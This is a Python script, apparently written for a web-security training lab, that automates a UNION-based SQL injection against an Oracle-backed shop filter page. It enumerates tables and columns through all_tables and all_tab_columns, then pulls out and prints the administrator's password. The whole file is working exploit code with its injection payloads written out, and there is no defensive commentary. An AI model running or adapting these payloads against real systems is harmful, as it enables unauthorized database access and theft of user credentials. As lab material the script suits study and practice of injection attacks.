import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def perform_request(url, sql_payload):
    path = "/filter?category=Gifts"
    # print (url+path+sql_payload)
    r = requests.get( url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('^USERS\_.*'))
    return users_table

def sqli_users_columns(url, user_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'-- " % user_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*USERNAME.*'))
    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return username_column, password_column

def sqli_administrator_cred(url, user_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" % (username_column, password_column, user_table)
    print(sql_payload)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    #print(soup)
    admin_password = soup.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password

if __name__ == "__main__":
    try :
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com " % sys.argv[0])
    
    print("Looking for the users table ...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name : %s" % users_table)
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column name: %s " % username_column)
            print("Found the password column name: %s " % password_column)

            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administator password is %s " % admin_password)
            else:
                print("Did not find administrator password")
        else:
            print("Did not find the username and/or the password columns")
    else:
        print("[x] Dit not find a users table.")
